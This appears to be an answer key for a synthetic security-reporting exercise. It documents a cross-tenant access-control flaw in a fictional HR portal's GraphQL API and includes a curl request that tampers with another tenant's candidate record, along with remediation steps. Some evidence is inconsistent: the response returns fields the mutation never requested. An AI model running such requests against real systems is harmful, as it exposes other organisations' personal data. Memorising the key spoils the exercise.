# Expected Response

## System
- **Domain:** HR Tech / Talent Acquisition
- **System:** JobCore Candidate Portal
- **Example ID:** GQL-0209

## Priority Findings

### Finding 1: HR Tech — BAC Metadata Side-Channel via updateCandidate Exposes Cross-Tenant Candidate Data (Pattern 2.2)
**Severity:** High
**Category:** Broken Access Control / Metadata/Attribute Side-Channel

**Summary:**
Per §4.0 (RISK-GQL-209): The `getCandidate` resolver fetches by `candidateId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 2.2 — metadata/attribute side-channel): the `updateCandidate` mutation returns metadata attributes (e.g., `ownerId`, `tenantId`, `sensitiveField`) in its response that leak cross-tenant ownership data. An attacker from `tenant-dd84` submitted `updateCandidate(id: "C-2209", input: {status: "approved", ownerId: "attacker-dd84c95f"})` against a candidate record belonging to `tenant-c95f`, receiving `CONFIDENTIAL-dd84c95f`. In HR Tech / Talent Acquisition, unauthorized access to candidate profiles, assessment data, and salary expectations constitutes a GDPR/employment privacy violation.

**Evidence from HAR:**
- Request: `POST https://api.jobcore-candidate-po.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-dd84`
- Mutation: `updateCandidate(id: "C-2209", input: {status: "approved", ownerId: "attacker-dd84c95f"}) { candidateId status }`
- Response `200 OK`: `tenantId: "tenant-c95f"`, `ownerId: "other-user-dd84c95f"`, `sensitiveField: "CONFIDENTIAL-dd84c95f"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-dd84c95f`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-209 | getCandidate resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 2.2 | Metadata/attribute side-channel via mutation response |
| HAR mutation | input.ownerId | attacker-dd84c95f (client-injected) |
| HAR response | tenantId | tenant-c95f leaked to tenant-dd84 |
| HAR response | sensitiveField | CONFIDENTIAL-dd84c95f |
| HAR header | x-request-id | req-dd84c95f |

## Steps to Reproduce

### Step 1 — updateCandidate metadata side-channel BAC (HAR)
```bash
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-dd84" \
  -d '{"query": "mutation { updateCandidate(id: \"C-2209\", input: {status: \"approved\", ownerId: \"attacker-dd84c95f\"}) { candidateId status } }"}'
```
**Vulnerable:** Returns `tenant-c95f` candidate metadata including `CONFIDENTIAL-dd84c95f`. **Secure:** FORBIDDEN — mutation rejected; no cross-tenant metadata returned.

## Remediation
1. Resolver: `WHERE candidate_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `CandidateInput`; derive from JWT.
3. Mutation response must not return cross-tenant metadata attributes.
4. Redis cache key: `candidate:{tenantId}:{candidateId}`.
